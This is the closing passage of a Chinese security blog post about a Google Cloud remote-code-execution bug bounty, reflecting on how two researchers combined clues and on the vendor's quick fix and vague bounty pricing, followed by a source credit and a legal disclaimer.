赏金定价的是攻击面，不是利用难度。  
  
这条链是两个人各自卡在半路、靠一次闲聊拼起来的：一边握着 client_id，另一边握着 GenericStubbyTypedTaskV2 的线索，Discord 群里一句话，两个死结同时解开。  
  
厂商那侧的信号同样清楚：  
  
定级快、赏得干脆，但修复要等灰度刷完全量后端才算数——PoC 跑通与全量修复之间只隔了一小时；而定价理由始终含糊。  
  
攻击者的时间窗口和厂商的解释力，比赏金数字更值得盯。  
  
十一  
读者须知  
  
研究来源：  
  
brutecat.com/articles/google-cloud-rce/  
  
本文内容整理自上述公开研究，仅用于安全研究、漏洞原理分析与防御科普，帮助安全从业者看清「把内部能力暴露给外部输入」这类授权边界缺陷是怎么出事的。  
  
文中涉及的接口、参数与调用链均已在授权范围内报告并修复；严禁将文中方法用于未经授权的系统、网络或账号。  
  
因将上述内容用于非法目的而产生的一切法律后果，由使用者自行承担。  
  
一个不正经的黑客　·　十年信息安全老兵  
  
© 2026 一个不正经的黑客　保留所有权利  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
